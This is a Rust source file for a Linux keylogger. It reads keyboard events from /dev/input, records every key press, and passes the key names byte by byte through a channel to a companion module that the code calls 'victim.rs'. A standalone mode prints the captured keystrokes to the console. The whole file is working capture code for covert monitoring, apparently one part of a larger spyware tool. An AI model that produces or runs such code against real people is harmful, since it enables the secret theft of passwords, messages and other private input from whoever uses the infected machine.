use evdev::{Device, EventSummary, KeyCode}; // Removed unused RelativeAxisCode, BusType
use std::fs;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::time::Instant;
use std::io::{self, Write};
use std::sync::mpsc::Sender;

#[derive(Default, Debug)]
struct Modifiers {
    shift: bool,
    ctrl: bool,
    alt: bool,
    meta: bool,
    capslock: bool,
}

impl Modifiers {
    fn update(&mut self, key: KeyCode, value: i32) {
        let pressed = value == 1;
        match key {
            KeyCode::KEY_LEFTSHIFT | KeyCode::KEY_RIGHTSHIFT => self.shift = pressed,
            KeyCode::KEY_LEFTCTRL | KeyCode::KEY_RIGHTCTRL => self.ctrl = pressed,
            KeyCode::KEY_LEFTALT | KeyCode::KEY_RIGHTALT => self.alt = pressed,
            KeyCode::KEY_LEFTMETA | KeyCode::KEY_RIGHTMETA => self.meta = pressed,
            KeyCode::KEY_CAPSLOCK if pressed => self.capslock = !self.capslock,
            _ => {}
        }
    }

    fn display(&self) -> String {
        let mut parts = Vec::new();
        if self.shift { parts.push("SHIFT"); }
        if self.ctrl { parts.push("CTRL"); }
        if self.alt { parts.push("ALT"); }
        if self.meta { parts.push("META"); }
        if self.capslock { parts.push("CAPS"); }

        if parts.is_empty() { "none".to_string() } else { parts.join(" ") }
    }
}

fn find_keyboard() -> io::Result<(Device, String)> {
    let mut candidates = Vec::new();
    for entry in fs::read_dir("/dev/input")? {
        let path = entry?.path();
        if !path.to_string_lossy().contains("event") { continue; }
        if let Ok(device) = Device::open(&path) {
            let Some(keys) = device.supported_keys() else { continue; };
            if keys.contains(KeyCode::KEY_A) && keys.contains(KeyCode::KEY_ENTER) {
                candidates.push((device, path.to_string_lossy().to_string()));
            }
        }
    }
    candidates.pop().ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "No keyboard found"))
}

fn parallels_remap(key: KeyCode) -> KeyCode {
    match key {
        KeyCode::KEY_LEFTMETA => KeyCode::KEY_LEFTALT,
        KeyCode::KEY_RIGHTMETA => KeyCode::KEY_RIGHTALT,
        KeyCode::KEY_LEFTALT => KeyCode::KEY_LEFTMETA,
        KeyCode::KEY_RIGHTALT => KeyCode::KEY_RIGHTMETA,
        _ => key,
    }
}

/// Core background loop used by victim.rs
pub fn run_with_flag(running: Arc<AtomicBool>, tx: Sender<u8>) -> io::Result<()> {
    let (mut device, _path) = find_keyboard()?;
    
    // Set to non-blocking so the loop can check the 'running' flag even if no one is typing
    device.set_nonblocking(true)?;

    while running.load(Ordering::SeqCst) {
        match device.fetch_events() {
            Ok(events) => {
                for ev in events {
                    // Only capture "PRESS" events (value == 1) to avoid duplicate data
                    if let EventSummary::Key(_, raw_key, 1) = ev.destructure() {
                        let key = parallels_remap(raw_key);
                        
                        // Convert KeyCode to a readable string (e.g., "KEY_ENTER" -> "ENTER ")
                        let key_name = format!("{:?} ", key).replace("KEY_", "");
                        
                        // Send each byte of the key name through the channel to victim.rs
                        for b in key_name.bytes() {
                            if let Err(_) = tx.send(b) {
                                return Ok(()); // Receiver hung up, stop logging
                            }
                        }
                    }
                }
            }
            Err(e) if e.kind() == io::ErrorKind::WouldBlock => {
                // No events to process, sleep a tiny bit to save CPU
                std::thread::sleep(std::time::Duration::from_millis(10));
            }
            Err(e) => return Err(e),
        }
    }

    Ok(())
}

/// Standalone entry point
pub fn run() -> io::Result<()> {
    println!("=== Standalone Keylogger Mode ===");
    let running = Arc::new(AtomicBool::new(true));
    
    // Create a channel so the standalone mode has somewhere to send bytes
    let (tx, rx) = std::sync::mpsc::channel();

    // Spawn a thread to print bytes received from the channel to the console
    std::thread::spawn(move || {
        while let Ok(b) = rx.recv() {
            print!("{}", b as char);
            std::io::stdout().flush().ok();
        }
    });

    let r = running.clone();
    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    }).expect("Error setting Ctrl+C handler");

    // Pass the transmitter (tx) here
    run_with_flag(running, tx)
}

fn main() -> io::Result<()> {
    run()
}
